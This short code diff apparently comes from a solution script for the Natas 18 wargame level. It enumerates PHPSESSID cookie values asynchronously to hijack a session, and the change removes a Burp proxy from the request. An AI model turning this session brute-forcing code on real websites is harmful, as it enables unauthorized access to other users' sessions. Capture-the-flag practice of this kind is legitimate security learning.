@@ -15,7 +15,8 @@ natas18_data = {"username": "user", "password": "pass"}
 
 async def post_phpsessid(url,session,sem,natas18_cookies,i):
 	natas18_cookies['PHPSESSID'] = str(i)
-	async with sem, session.post(url,headers=natas18_hdrs,data=natas18_data,cookies=natas18_cookies,proxy=burp_proxy) as resp:
+	#async with sem, session.post(url,headers=natas18_hdrs,data=natas18_data,cookies=natas18_cookies,proxy=burp_proxy) as resp:
+	async with sem, session.post(url,headers=natas18_hdrs,data=natas18_data,cookies=natas18_cookies) as resp:
 		data = await resp.text()
 		if (truestring in data):
 			print(data)
